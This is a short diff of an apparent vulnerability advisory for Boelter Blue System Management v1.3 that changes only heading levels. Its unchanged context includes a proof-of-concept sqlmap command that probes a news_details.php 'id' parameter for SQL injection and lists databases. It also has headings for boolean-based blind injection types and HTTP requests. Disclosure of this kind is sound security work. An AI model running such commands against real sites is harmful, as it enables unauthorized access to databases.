@@ -23,7 +23,7 @@ Boelter Blue System Management v1.3 has been found to contain multiple critical 
 >  - section parameter
 
   
-#### PoC Example
+## PoC Example
 **SQLMap Injection**:   
 `sqlmap -u "https://www.example.com/news_details.php?id=10071" --random-agent --dbms=mysql --dbs`
 
@@ -40,7 +40,7 @@ Boelter Blue System Management v1.3 has been found to contain multiple critical 
 
 
 
-**Injection Types**:
+## Injection Types:
 
     Boolean-based blind
     Parameter: id (GET)
@@ -63,7 +63,7 @@ Boelter Blue System Management v1.3 has been found to contain multiple critical 
 
 
 
-**HTTP Requests**:
+## HTTP Requests:
 
     Boolean-based blind
     
